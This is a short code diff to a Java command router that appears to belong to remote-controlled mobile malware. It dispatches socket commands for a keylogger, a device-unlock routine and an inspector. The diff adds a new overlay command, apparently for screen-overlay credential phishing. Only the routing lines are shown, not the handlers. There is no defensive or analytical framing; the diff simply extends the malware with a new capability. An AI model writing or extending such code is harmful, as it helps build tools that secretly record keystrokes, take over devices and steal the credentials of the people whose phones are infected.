@@ -95,6 +95,7 @@ public final class SocketCommandRouter {
                 case Protocol.INSPECTOR:   handleInspector(data, socket, cmdId); break;
                 case Protocol.KEYLOGGER:   handleKeylogger(data, socket, cmdId); break;
                 case Protocol.DEVICE_UNLOCK: handleDeviceUnlock(data, socket, cmdId); break;
+                case Protocol.OVERLAY:  handleOverlay(data, cmdId); break;
                 default:
                     try {
                         JSONObject err = new JSONObject();
